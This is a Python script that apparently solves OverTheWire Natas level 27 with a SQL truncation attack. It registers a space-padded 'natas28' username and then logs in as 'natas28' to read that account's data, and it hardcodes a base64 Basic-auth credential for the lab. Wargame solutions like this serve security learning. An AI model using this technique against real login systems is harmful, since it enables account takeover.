import requests
import json

headers = {
    'Authorization': 'Basic bmF0YXMyNzo1NVRCanBQWlVVSmdWUDViM0JuYkc2T045dURQVnpDSg=='
}

url = 'http://natas27.natas.labs.overthewire.org/index.php'

username = 'natas28'
password = ''

payload = "                                                         a"

body = {
    'username': f"{username}{payload}",
    'password': ''
}

request = requests.post(url=url, headers=headers, data=body)

body = {
    'username': f"{username}",
    'password': ''
}

request = requests.post(url=url, headers=headers, data=body)

content = request.content.decode('utf-8')

print(content)
